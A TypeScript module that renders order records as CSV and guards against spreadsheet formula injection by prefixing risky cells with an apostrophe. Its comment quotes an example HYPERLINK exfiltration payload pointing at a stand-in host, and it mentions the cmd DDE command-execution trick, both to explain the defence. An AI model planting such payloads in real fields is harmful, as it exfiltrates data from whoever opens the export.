import type { OrderRow } from '../shared/types.js';

/**
 * Neutralize spreadsheet formula injection (CWE-1236).
 *
 * Excel, LibreOffice Calc and Google Sheets evaluate any cell whose text
 * begins with `=`, `+`, `-`, `@`, a tab or a CR as a formula. RFC-4180
 * quoting below does NOT stop that — the quotes are stripped as the file is
 * parsed, and the cell is interpreted afterwards. Every column here carries
 * text somebody typed into this application, so a supplier or employee named
 * `=HYPERLINK("https://evil.example/?d="&A1,"Open")` becomes a live
 * exfiltration link the moment an operator opens the export, and the
 * `=cmd|'/c ...'!A1` family reaches further than that on Windows.
 *
 * A leading apostrophe forces the cell to text in all three programs and is
 * the standard mitigation. Plain numbers are exempt so `-42` stays a number:
 * a lone minus sign cannot start a formula, only an expression can.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/;

function neutralizeFormula(value: string): string {
  if (!FORMULA_LEAD.test(value) || PLAIN_NUMBER.test(value)) return value;
  return `'${value}`;
}

function escapeCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  const str = neutralizeFormula(String(value));
  if (/[",\n\r]/.test(str)) return `"${str.replaceAll('"', '""')}"`;
  return str;
}

/**
 * Render orders as RFC-4180 CSV, one row per order. Money columns are
 * integer cents, derived from the snapshot lines by the same shared
 * function the API uses — the export can never disagree with the UI.
 */
export function ordersCsv(rows: OrderRow[]): string {
  const header = [
    'ref',
    'created_at',
    'status',
    'payment_status',
    'customer_name',
    'email',
    'item_count',
    'net_cents',
    'vat_cents',
    'gross_cents',
  ];
  const lines = [header.join(',')];
  for (const row of rows) {
    lines.push(
      [
        row.ref,
        row.created_at,
        row.status,
        row.payment_status,
        row.customer_name,
        row.email,
        row.item_count,
        row.net_cents,
        row.vat_cents,
        row.gross_cents,
      ]
        .map(escapeCell)
        .join(','),
    );
  }
  return lines.join('\r\n') + '\r\n';
}
